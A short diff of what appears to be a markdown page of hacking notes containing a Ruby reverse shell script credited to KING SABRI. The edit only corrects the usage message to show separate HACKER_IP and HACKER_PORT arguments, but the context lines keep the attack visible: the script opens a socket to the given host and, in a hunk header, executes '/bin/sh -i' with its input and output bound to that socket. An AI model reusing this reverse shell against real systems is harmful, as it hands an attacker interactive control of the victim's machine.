@@ -110,7 +110,7 @@ cd rshell
 # KING SABRI | @KINGSABRI
 require 'socket'
 if ARGV.size < 2
-  puts "ruby #{__FILE__} [HACKER_IP  HACKER_PORT]\n\n"
+  puts "ruby #{__FILE__} [HACKER_IP] [HACKER_PORT]\n\n"
   exit 0 
 end
 ip, port = ARGV
@@ -122,7 +122,7 @@ exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
 
 ```
 ruby rshell.rb 
-# => ruby rshell.rb [HACKER_IP  HACKER_PORT]
+# => ruby rshell.rb [HACKER_IP] [HACKER_PORT]
 ```
 
 
